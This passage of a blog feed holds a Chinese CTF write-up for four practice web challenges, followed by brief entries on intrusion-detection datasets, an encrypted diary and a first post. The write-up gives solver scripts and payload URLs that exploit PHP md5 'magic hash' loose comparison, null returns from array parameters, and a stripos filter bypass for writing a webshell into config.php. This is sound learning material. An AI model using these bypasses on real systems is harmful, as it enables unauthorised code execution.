    <content type="html"><![CDATA[<p>Blue-whale OJ<br>calculator、RapidTyping、Basic PHP、Basic PHP 2 writeup.</p><a id="more"></a><blockquote><p>今天是测试第一阶段的第一天。Keep posting!</p></blockquote><ul><li><a href="#Calculator">Calculator</a></li><li><a href="#RapidTyping">RapidTyping</a></li><li><a href="#Basic-PHP">Basic PHP</a></li><li><a href="#Basic-PHP-2">Basic PHP 2</a></li><li><a href="#总结">总结</a><h1 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h1><center><img src="https://s2.ax1x.com/2020/03/08/3z3niQ.md.jpg" alt="3z3niQ.jpg" border="0"></center>从题目要求可以看到，需要在1.5s内计算出一个比较大的四则运算。按计算器估计是来不及了，由hint我们知道用Python来实现。先贴代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url = <span class="string">"http://vps1.blue-whale.me:23331/calculator/"</span></span><br><span class="line">cal_session = requests.session()</span><br><span class="line">cal_respond = cal_session.get(url)</span><br><span class="line"><span class="comment"># print(cal_respond.text)</span></span><br><span class="line">soup = BeautifulSoup(cal_respond.text, <span class="string">'lxml'</span>)</span><br><span class="line">span = soup.find(<span class="string">"span"</span>, id=<span class="string">"exp"</span>)</span><br><span class="line">num = eval(span.text.replace(<span class="string">'='</span>, <span class="string">''</span>))</span><br><span class="line"><span class="comment"># print(num)</span></span><br><span class="line">ans = &#123;<span class="string">"answer"</span>: num&#125;</span><br><span class="line">r = cal_session.get(url, params=ans)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>代码分为几个阶段：<br>首先使用了<kbd>requests</kbd>，它是基于urllib3的一个用于发起http请求的包；之后引入了比较常见的<kbd>BeautifulSoup</kbd>。创建一个session对象后，发送请求并获得返回的response对象。</p><center><img src="https://s2.ax1x.com/2020/03/08/3ztwbq.jpg" alt="3ztwbq.jpg" border="0"></center>接下来将其转为BeautifulSoup对象，找到其中id为exp的span标签，将其内容去掉最后的等号后作为参数传入eval函数，将计算结果封装为get的参数，再次请求得到返回的带有flag的网页。<blockquote><p>通过这个入门题目可以练习常用包<kbd>requests</kbd>和<kbd>BeautifulSoup</kbd>的使用。</p></blockquote><h1 id="RapidTyping"><a href="#RapidTyping" class="headerlink" title="RapidTyping"></a>RapidTyping</h1><center><img src="https://s2.ax1x.com/2020/03/08/3zNjl4.jpg" alt="3zNjl4.jpg" border="0"></center>这个题目跟上个题目有点相似，也是要求在短时间内完成验证码输入。题目给出hint说不是用图像识别啥的，那就看看网页源代码吧。<center><img src="https://s2.ax1x.com/2020/03/08/3zUgBR.jpg" alt="3zUgBR.jpg" border="0"></center>做过的CTF题目不多，多是入门题，发现这种比较入门的题目通常要结合Base64之类的东西来考察，或者是在前端做一些限制。把后面这堆结尾是等号的代码拖到Base64解码里会发现是一大堆形似html的代码，其中text标签中包含的就是图片中的字母。下面贴上代码：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://vps1.blue-whale.me:23331/captcha/"</span></span><br><span class="line">session = requests.session()</span><br><span class="line">respond = session.get(url)</span><br><span class="line">soup = BeautifulSoup(respond.text, <span class="string">"lxml"</span>)</span><br><span class="line"><span class="comment"># print(soup.img.attrs["src"])</span></span><br><span class="line">encoded = soup.img.attrs[<span class="string">"src"</span>].lstrip(<span class="string">"data:image/svg+xml;base64,"</span>)</span><br><span class="line"><span class="comment"># print(encoded)</span></span><br><span class="line">encoded = base64.b64decode(encoded)</span><br><span class="line">soup = BeautifulSoup(encoded, <span class="string">"lxml"</span>)</span><br><span class="line">decoded = soup.find_all(name=<span class="string">"text"</span>)</span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> decoded:</span><br><span class="line">        <span class="keyword">if</span> i == int(s[<span class="string">"x"</span>]):</span><br><span class="line">            ans += str(s.text)</span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line">answ = &#123;<span class="string">"code"</span>:ans&#125;</span><br><span class="line">r = session.get(url,params=answ)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>代码逻辑如下：依然是<kbd>requests</kbd>+<kbd>BeautifulSoup</kbd>获取页面内容，截取img标签src属性中的base64部分后解码，将text部分提取出来后带入二重循环，保证将每个字母按照x坐标的顺序加入到ans字符串中。最后将结果作为参数再次请求得到flag。</p><blockquote><p>这里先按x坐标排序后再逐个提取字母速度更快，不过对python的数据结构不甚了解，未能实现。Python的学习有待加强。通过这个题目练习了<kbd>requests</kbd>、<kbd>base64</kbd>和<kbd>BeautifulSoup</kbd>的使用。</p></blockquote><h1 id="Basic-PHP"><a href="#Basic-PHP" class="headerlink" title="Basic PHP"></a>Basic PHP</h1><p>这题在bugku里见过，点开题目即可看到代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exercise<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>PHP's basic feature<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--好吧其实是老套路了--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'test'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// ========== Stage 1 ========== </span></span></span><br><span class="line"><span class="php">    $test=$_GET[<span class="string">'test'</span>]; </span></span><br><span class="line"><span class="php">    $test=md5($test); </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($test==<span class="string">'0'</span>) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'You passed stage 1.&lt;br /&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">"Game over at stage 1."</span>; </span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// ========== Stage 2 ========== </span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'You passed stage 2.&lt;br /&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Flag: '</span>.$flag;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;hr /&gt;'</span>;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>输入name、password和test三个参数即可进入stage1，接下来是md5()漏洞的一个考察：</p><blockquote><p>PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，其中存在一个缺陷，就是它<strong>把每个以“0E”开头的哈希值都解析为0后再进行比较。所以，两个不同的密码经过md5()哈希以后，其哈希值都是以“0E”开头的话，那么PHP将会认为他们是相等的，都是0。</strong></p></blockquote><p>根据这个特性，找到一些md5后产生“0E”开头的字符串作为test的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>随后进入stage2，我们发现题目要求name和password的值不同，而sha1的结果相同。想找到这种碰撞的概率太低了，此处考察了 <strong>sha1() 和 md5() 处理数组时会直接返回null，那么可以使 name 和 password为数组类型，sha1 对数组处理后返回 null 绕过 ===(===会判断左右两边的类型和值是否相同) 。</strong> 此时可以令name[]=0&amp;password[]=1，即可得到flag。</p><blockquote><p>问题：令name[]=0&amp;password[]=0为什么不行？总之会返回null，值是0还是1会有影响吗</p></blockquote><table><tr><td bgcolor="#87CEFA">payload:http://vps1.blue-whale.me:23331/feature/?test=s878926199a&password[]=0&name[]=1</td></tr></table><h1 id="Basic-PHP-2"><a href="#Basic-PHP-2" class="headerlink" title="Basic PHP 2"></a>Basic PHP 2</h1><center><img src="https://s2.ax1x.com/2020/03/08/3zINAP.jpg" alt="3zINAP.jpg" border="0"></center>题目给出要求getshell，联想到一句话木马，在这个框中随意输入内容，点击start进入新的页面：<center><img src="https://s2.ax1x.com/2020/03/08/3zoSud.jpg" alt="3zoSud.jpg" border="0"></center>在文本框输入一些内容后点击提交，回显success，此时再点击上面的./config.php会发现之前在文本框中的内容已被写入config.php。再结合下面的代码来看：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]))&#123;</span><br><span class="line">    $filename = <span class="string">'config.php'</span>;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_int(stripos($content, <span class="string">'php'</span>)) || is_int(stripos($content, <span class="string">'&lt;'</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        file_put_contents($filename, $content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br><br>strpos() 函数查找字符串在另一字符串中第一次出现的位置（大小写敏感）。</p></blockquote><p>意思已经比较明显了，我们可以通过content这个参数修改config.php中的内容，但是若想写入php一句话木马，就无法通过stripos()的检验(可以看到对<strong>php和&lt;</strong> 这两个字符串做了检测 )，此时可以利用strpos传入数组时会返回null，经is_int判断后返回false，即可绕过第一个条件判断（看起来stripos也存在这个问题）；这时候就可以通过file_put_content将一句话木马写入config.php了(其实只写一个&lt;即可得到flag)。</p><table><tr><td bgcolor="#87CEFA">payload:http://vps1.blue-whale.me:23360/user/b4466a4c89f48932020df576d9a77e41902f5a0e/index.php?content[]=<</td></tr></table><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>完成了第一天的任务，学到了很多东西，也挖下些坑，比如对md5的一些操作需要总结，一些问题需要解答，要继续学习</p></blockquote><p><a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/" target="_blank" rel="noopener">PHP黑魔法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;calculator、RapidTyping、Basic PHP、Basic PHP 2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>毕业设计笔记</title>
    <link href="https://purewhitywhite.github.io/2020-01-20/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <id>https://purewhitywhite.github.io/2020-01-20/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-20T08:11:02.000Z</published>
    <updated>2020-03-08T01:07:44.919Z</updated>
    
    <content type="html"><![CDATA[<p>随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。</p><a id="more"></a><h1 id="网络异常流量检测研究"><a href="#网络异常流量检测研究" class="headerlink" title="网络异常流量检测研究"></a>网络异常流量检测研究</h1><h2 id="数据集选择"><a href="#数据集选择" class="headerlink" title="数据集选择"></a>数据集选择</h2><ul><li><p><a href="http://kdd.ics.uci.edu/databases/kddcup99/kddcup99.html" target="_blank" rel="noopener"><strong>KDD99</strong></a><br>该数据集是从一个模拟的美国空军局域网上采集来的9个星期的网络连接数据,分成具有标识的训练数据和未加标识的测试数据。测试数据和训练数据有着不同的概率分布,测试数据包含了一些未出现在训练数据中的攻击类型,这使得入侵检测更具有现实性。</p></li><li><p><a href="https://www.unb.ca/cic/datasets/nsl.html" target="_blank" rel="noopener"><strong>NSL-KDD</strong></a><br>该数据集解决了KDD99数据集中存在的固有问题。NSL-KDD数据集由于缺少基于入侵检测网络的公共数据集，所以NSL-KDD数据集仍然存在一些问题，同时也不是现有真实网络的完美代表。但它仍然可以用作有效的基准数据集，以帮助研究人员比较不同的入侵检测方法。NSL-KDD训练集和测试集的设置是合理的，不同研究工作的评估结果将是一致的和可比的。二者具体区别见下：</p></li></ul><ol><li>It does not include redundant records in the train set, so the classifiers will not be biased towards more frequent records.<blockquote><p>NSL-KDD数据集的训练集中<strong>不包含冗余记录</strong>，所以分类器<strong>不会偏向更频繁的记录</strong>；</p></blockquote></li><li>There is no duplicate records in the proposed test sets; therefore, the performance of the learners are not biased by the methods which have better detection rates on the frequent records.<blockquote><p>NSL-KDD数据集的测试集中<strong>没有重复的记录</strong>，使得<strong>检测率更为准确</strong>。</p></blockquote></li><li>The number of selected records from each difficultylevel group is inversely proportional to the percentage of records in the original KDD data set. As a result, the classification rates of distinct machine learning methods vary in a wider range, which makes it more efficient to have an accurate evaluation of different learning techniques.<blockquote><p>来自每个难度级别组的所选记录的数量与原始KDD数据集中的记录的百分比成反比。结果，不同机器学习方法的分类率在更宽的范围内变化，这使得对不同学习技术的准确评估更有效。</p></blockquote></li><li>The number of records in the train and test sets are reasonable, which makes it affordable to run the experiments on the complete set without the need to randomly select a small portion. Consequently, evaluation results of different research works will be consistent and comparable.<blockquote><p>训练和测试中的记录数量设置是合理的，这使得在整套实验上运行实验成本低廉而无需随机选择一小部分。因此，不同研究工作的评估结果将是一致的和可比较的。</p></blockquote></li></ol><h2 id="常用的深度学习算法"><a href="#常用的深度学习算法" class="headerlink" title="常用的深度学习算法"></a>常用的深度学习算法</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="IDS" scheme="https://purewhitywhite.github.io/tags/IDS/"/>
    
  </entry>
  
  <entry>
    <title>实习日记</title>
    <link href="https://purewhitywhite.github.io/2020-01-07/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>https://purewhitywhite.github.io/2020-01-07/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-01-07T09:08:09.000Z</published>
    <updated>2020-01-21T01:11:22.818Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter password.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a9ed1c0d80c9ec0c2a7263cafe076f953677b69b0476b88b1cbcb76adcaffe42"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Say hello to the 20s.
    
    </summary>
    
    
    
      <category term="工作" scheme="https://purewhitywhite.github.io/tags/%E5%B7%A5%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇博客</title>
    <link href="https://purewhitywhite.github.io/2019-06-01/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <id>https://purewhitywhite.github.io/2019-06-01/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
    <published>2019-06-01T13:39:12.000Z</published>
    <updated>2020-01-07T09:20:11.181Z</updated>
    
    <content type="html"><![CDATA[<p>Better late than never,huh?</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Better late than never,huh?&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
</feed>
